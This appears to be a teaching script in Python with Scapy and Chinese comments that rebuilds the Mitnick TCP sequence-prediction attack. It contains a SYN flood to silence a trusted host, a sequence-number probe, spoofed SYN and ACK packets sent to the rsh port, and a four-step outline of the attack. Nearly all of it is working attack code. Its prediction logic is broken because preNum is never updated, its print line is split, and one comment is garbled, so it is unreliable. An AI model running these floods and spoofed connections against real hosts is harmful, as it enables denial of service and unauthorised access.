# coding=UTF-8
"""
理解 TCP 序列预测攻击

Scapy

"""

import optparse
from scapy.all import *


#SYN洪水攻击
def synFlood(src, tgt):
    for sport in range(1024, 65535):
        IPlayer = IP(src=src, dst=tgt)
        TCPlayer = TCP(sport=sport, dport=513)
        pkt = IPlayer / TCPlayer
        send(pkt)


# 预测TCP序列号
def calTSN(tgt):
    seqNum = 0

    preNum = 0
    diffSeq = 0
    for x in range(1, 5):
        if preNum != 0:
            preNum = seqNum
        pkt = IP(dst=tgt) / TCP()
        ans = sr1(pkt, verbose=0)
        seqNum = ans.getlayer(TCP).seq
        diffSeq = seqNum - preNum
        print
        '[+] TCP Seq Difference: ' + str(diffSeq)
    return seqNum + diffSeq

#发送ACk欺骗包
def spoofConn(src, tgt, ack):
    IPlayer = IP(src=src, dst=tgt)
    TCPlayer = TCP(sport=513, dport=514)
    synPkt = IPlayer / TCPlayer
    send(synPkt)
    IPlayer = IP(src=src, dst=tgt)
    TCPlayer = TCP(sport=513, dport=514, ack=ack)
    ackPkt = IPlayer / TCPlayer
    send(ackPkt)
#SYN洪水攻击

# 1.找到一个可信的服务器;
# 2.沉默的可信服务器;为了让机器沉默,米特尼克发送了一类咧的 TCP SYN 包到服务器的登陆端口。被称为 SYN 洪水攻击,TCP 系列号的随机性是不存在的,目标和 Shimomura 的机器有相同的序列号差值。
# 3.欺骗来自服务器的连接;
# 4.盲目的欺骗正确的 TCP 三次握手包的 ACK 包。
